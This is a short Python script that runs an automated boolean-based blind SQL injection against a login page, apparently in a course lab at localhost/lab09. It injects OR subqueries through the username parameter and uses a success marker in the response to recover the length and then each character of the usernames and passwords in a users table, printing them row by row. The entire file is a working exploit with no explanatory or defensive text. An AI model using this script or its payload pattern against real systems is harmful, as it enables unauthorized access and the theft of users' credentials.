import urllib.request
import urllib.parse
import string

BASE_URL = "http://localhost/lab09/login.php"
CHARSET = string.ascii_letters + string.digits
SUCCESS_MARKER = "Printing cat"

def is_success(u, p):
    params = urllib.parse.urlencode({"u": u, "p": p})
    url = BASE_URL + "?" + params
    response = urllib.request.urlopen(url)
    html = response.read().decode("utf-8")
    return SUCCESS_MARKER in html

def get_length(row, field):
    for length in range(1, 200):
        payload = '" OR (SELECT LENGTH(' + field + ') FROM users LIMIT 1 OFFSET ' + str(row) + ')=' + str(length) + ' -- '
        if is_success(payload, "x"):
            return length
    return 0

def get_char(row, field, pos):
    for c in CHARSET:
        payload = '" OR (SELECT ASCII(SUBSTRING(' + field + ',' + str(pos) + ',1)) FROM users LIMIT 1 OFFSET ' + str(row) + ')=' + str(ord(c)) + ' -- '
        if is_success(payload, "x"):
            return c
    return ""

results = []
for row in range(100):
    ulen = get_length(row, "username")
    username = ""
    for i in range(1, ulen + 1):
        username = username + get_char(row, "username", i)
    plen = get_length(row, "password")
    password = ""
    for i in range(1, plen + 1):
        password = password + get_char(row, "password", i)
    results.append((username, password))
    print("Row " + str(row) + ": " + username + " / " + password)
